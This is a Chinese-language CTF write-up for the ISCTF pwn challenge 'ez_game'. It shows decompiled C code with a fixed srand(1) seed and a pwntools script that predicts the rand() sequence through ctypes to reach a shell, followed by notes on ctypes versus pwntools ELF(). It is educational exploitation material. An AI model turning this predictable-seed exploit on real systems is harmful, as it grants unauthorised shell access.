# ISCTF pwn方向“ez_game"

by Maple

本来以为是直接栈溢出跳转后门函数，结果数据有点大，溢出不到，最后还是直接伪随机数解决

先看源码

``` c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v4; // [rsp+Ch] [rbp-1A4h] BYREF
  char v5[400]; // [rsp+10h] [rbp-1A0h] BYREF
  unsigned int seed; // [rsp+1A0h] [rbp-10h]
  int v7; // [rsp+1A8h] [rbp-8h]
  int i; // [rsp+1ACh] [rbp-4h]

  init(argc, argv, envp);
  seed = 1;
  puts("Welcome to ISCTF's pwn mini-game.");
  puts("This procedure is only 15 seconds");
  signal(14, handle_sigalrm);
  alarm(0xFu);
  printf("Enter your username: ");
  gets(v5);
  srand(seed);
  for ( i = 0; i <= 20000; ++i )
  {
    v7 = rand() % 7 + 1;
    printf("Round %d\n", (unsigned int)(i + 1));
    printf("Please enter the number you want to guess: ");
    __isoc99_scanf("%d", &v4);
    if ( v7 != v4 )
    {
      puts("Wrong, goodbye");
      exit(1);
    }
    puts("Congratulations, you win!");
  }
  getshell();
  return 0;
}
```

seed = 1，2w次循环，全猜对了就可以getshell，那就跟着来就行

```python
from pwn import *
from ctypes import *

p = process('./ez_game')
elf = ELF('./ez_game')
libc = cdll.LoadLibrary('./libc.so.6')

libc.srand(1);	# 设置随机数种子为1，源码是这样写的
result = [0]*20001	# 创建一个20001长度的列表，初始化为0
for i in range(20001):
    result[i] = str(libc.rand()%7+1)

payload = b'a'
p.sendlineafter(b'username: ',payload)

for i in range(20001):
    p.sendline(result[i])

p.interactive()
```

## ctypes

`from ctypes import *`引入了`ctypes`库，这个库允许Python调用系统中的C库函数。它可以访问和操作C数据结构、内存和地址

**`libc = cdll.LoadLibrary("./libc.so.6")`来加载本地的动态链接库文件，以此调用`libc`中提供的各种函数**

注意，它和`libc = ELF('./libc.so.6')`完全是两件事。

- `cdll.LoadLibrary()`是创建了一个叫做`libc`的，可以访问`libc.so.6`库的对象

- `ELF()`是创建了一个包含该二进制文件元数据的元素（包括符号表、地址偏移、函数符号等）的对象

| 方式                 | 功能                                      | 使用场景                                                     |
| -------------------- | ----------------------------------------- | ------------------------------------------------------------ |
| `cdll.LoadLibrary()` | 加载动态链接库，允许调用其中的函数        | 直接调用 C 函数，进行底层操作。常用于与 C 库进行交互（如调用 `rand()`、`srand()` 等函数）。 |
| `ELF()`              | 解析 ELF 格式的文件，提供符号、地址等信息 | 进行二进制分析、漏洞利用等，查找函数的地址、进行地址计算或符号解析。 |